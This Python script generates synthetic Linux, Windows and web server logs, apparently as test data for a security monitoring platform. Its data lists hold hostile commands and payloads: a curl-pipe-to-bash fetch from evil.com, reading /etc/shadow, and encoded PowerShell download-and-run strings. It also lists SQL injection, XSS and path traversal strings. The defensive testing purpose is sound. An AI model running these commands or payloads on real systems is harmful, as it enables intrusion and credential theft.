"""
Generate sample log data for testing the platform.
"""
import random
import uuid
from datetime import datetime, timedelta

def generate_linux_auth_logs(count=100):
    """Generate sample Linux auth logs."""
    logs = []
    ips = ["192.168.1." + str(i) for i in range(1, 50)]
    users = ["root", "admin", "user1", "user2", "ubuntu", "test", "oracle"]
    
    templates = [
        "Dec {day:02d} {hour:02d}:{minute:02d}:{second:02d} server sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2",
        "Dec {day:02d} {hour:02d}:{minute:02d}:{second:02d} server sshd[{pid}]: Accepted password for {user} from {ip} port {port} ssh2",
        "Dec {day:02d} {hour:02d}:{minute:02d}:{second:02d} server sshd[{pid}]: Invalid user {user} from {ip} port {port}",
        "Dec {day:02d} {hour:02d}:{minute:02d}:{second:02d} server sshd[{pid}]: Connection closed by {ip} port {port}",
        "Dec {day:02d} {hour:02d}:{minute:02d}:{second:02d} server sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}",
        "Dec {day:02d} {hour:02d}:{minute:02d}:{second:02d} server sshd[{pid}]: error: PAM: Authentication failure for {user} from {ip}",
        "Dec {day:02d} {hour:02d}:{minute:02d}:{second:02d} server sshd[{pid}]: reverse mapping checking getaddrinfo for {ip} failed - POSSIBLE BREAK-IN ATTEMPT!",
    ]
    
    commands = ["/bin/bash", "whoami", "cat /etc/shadow", "nmap -sS 192.168.1.0/24", "curl http://evil.com/script.sh | bash", "chmod 777 /tmp/exploit"]
    
    # Generate some brute force patterns
    brute_force_ip = random.choice(ips)
    brute_force_user = random.choice(users)
    
    for i in range(count):
        now = datetime.now() - timedelta(minutes=random.randint(0, 1440))
        
        # Add brute force pattern for first 15 entries
        if i < 15:
            template = templates[0]  # Failed password
            user = brute_force_user
            ip = brute_force_ip
        elif i == 15:
            template = templates[1]  # Accepted password (success after brute force)
            user = brute_force_user
            ip = brute_force_ip
        else:
            template = random.choice(templates)
            user = random.choice(users)
            ip = random.choice(ips)
        
        log = template.format(
            day=now.day,
            hour=now.hour,
            minute=now.minute,
            second=now.second,
            pid=random.randint(1000, 9999),
            user=user,
            ip=ip,
            port=random.randint(10000, 65000),
            cmd=random.choice(commands),
        )
        logs.append(log)
    
    return logs


def generate_windows_logs(count=100):
    """Generate sample Windows security logs."""
    logs = []
    event_ids = ["4624", "4625", "4634", "4648", "4672", "4688", "4697", "4103", "4104", "7045"]
    ips = ["10.0.0." + str(i) for i in range(1, 50)]
    users = ["Administrator", "john.doe", "jane.smith", "svc_backup", "SYSTEM", "LOCAL SERVICE"]
    processes = ["cmd.exe", "powershell.exe", "wscript.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "rundll32.exe"]
    
    templates = [
        '{{"timestamp":"{timestamp}","EventID":"{event_id}","Computer":"WORKSTATION01","IpAddress":"{ip}","TargetUserName":"{user}","LogonType":"3"}}',
        '{{"timestamp":"{timestamp}","EventID":"{event_id}","Computer":"DC01","IpAddress":"{ip}","SubjectUserName":"{user}","NewProcessName":"C:\\\\Windows\\\\System32\\\\{process}"}}',
        '{{"timestamp":"{timestamp}","EventID":"{event_id}","Computer":"SERVER02","HostApplication":"powershell.exe -enc {encoded}"}}',
        '{{"timestamp":"{timestamp}","EventID":"{event_id}","Computer":"WORKSTATION01","ServiceName":"{service}","ImagePath":"C:\\\\Windows\\\\{process}"}}',
    ]
    
    services = ["WindowsUpdate", "SysmonSvc", "BackupService", "WinDefendFake", "CredentialSvc"]
    encoded_commands = [
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
        "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAAdwBpAG4AMwAyAF8AcAByAG8AYwBlAHMAcwAgAHwAIAB3AGgAZQByAGUAIAB7ACQAXwAuAG4AYQBtAGUAIAAtAGwAaQBrAGUAIAAnAGwAcwBhAHMAcwAuAGUAeABlACcAfQApAA==",
    ]
    
    for i in range(count):
        now = datetime.now() - timedelta(minutes=random.randint(0, 1440))
        
        template = random.choice(templates)
        event_id = random.choice(event_ids)
        
        log = template.format(
            timestamp=now.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
            event_id=event_id,
            ip=random.choice(ips),
            user=random.choice(users),
            process=random.choice(processes),
            encoded=random.choice(encoded_commands),
            service=random.choice(services),
        )
        logs.append(log)
    
    return logs


def generate_web_logs(count=100):
    """Generate sample web server logs."""
    logs = []
    ips = ["203.0.113." + str(i) for i in range(1, 100)]
    endpoints = ["/", "/login", "/api/users", "/admin", "/wp-admin", "/phpmyadmin", "/search", "/product/123"]
    methods = ["GET", "POST", "PUT", "DELETE"]
    status_codes = [200, 200, 200, 301, 302, 400, 401, 403, 404, 404, 404, 500]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1)",
        "sqlmap/1.7.6#stable",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "curl/7.88.1",
        "python-requests/2.31.0",
    ]
    
    # SQL injection patterns
    sql_patterns = [
        "?id=1' OR '1'='1",
        "?search=1 UNION SELECT * FROM users",
        "?user=admin'--",
        "?id=1; DROP TABLE users;--",
    ]
    
    # XSS patterns
    xss_patterns = [
        "?q=<script>alert(1)</script>",
        "?name=<img src=x onerror=alert(1)>",
        "?callback=javascript:alert(document.cookie)",
    ]
    
    # Path traversal patterns
    traversal_patterns = [
        "?file=../../../etc/passwd",
        "?page=....//....//etc/shadow",
        "?path=..%2F..%2F..%2Fwindows%2Fwin.ini",
    ]
    
    attack_patterns = sql_patterns + xss_patterns + traversal_patterns
    
    for i in range(count):
        now = datetime.now() - timedelta(minutes=random.randint(0, 1440))
        
        # 20% of logs are attack attempts
        if random.random() < 0.2:
            endpoint = random.choice(attack_patterns)
            status = random.choice([403, 404, 500, 200])
        else:
            endpoint = random.choice(endpoints) + ("?q=test" if random.random() < 0.5 else "")
            status = random.choice(status_codes)
        
        log = '{ip} - - [{timestamp}] "{method} {endpoint} HTTP/1.1" {status} {bytes} "-" "{ua}"'.format(
            ip=random.choice(ips),
            timestamp=now.strftime("%d/%b/%Y:%H:%M:%S +0000"),
            method=random.choice(methods),
            endpoint=endpoint,
            status=status,
            bytes=random.randint(100, 10000),
            ua=random.choice(user_agents),
        )
        logs.append(log)
    
    return logs


def main():
    """Generate all sample log files."""
    import os
    
    os.makedirs("datasets", exist_ok=True)
    
    # Generate Linux auth logs
    linux_logs = generate_linux_auth_logs(200)
    with open("datasets/linux_auth.log", "w") as f:
        f.write("\n".join(linux_logs))
    print(f"Generated datasets/linux_auth.log with {len(linux_logs)} entries")
    
    # Generate Windows logs
    windows_logs = generate_windows_logs(200)
    with open("datasets/windows_security.json", "w") as f:
        f.write("\n".join(windows_logs))
    print(f"Generated datasets/windows_security.json with {len(windows_logs)} entries")
    
    # Generate web logs
    web_logs = generate_web_logs(200)
    with open("datasets/apache_access.log", "w") as f:
        f.write("\n".join(web_logs))
    print(f"Generated datasets/apache_access.log with {len(web_logs)} entries")
    
    print("\nSample data generation complete!")


if __name__ == "__main__":
    main()
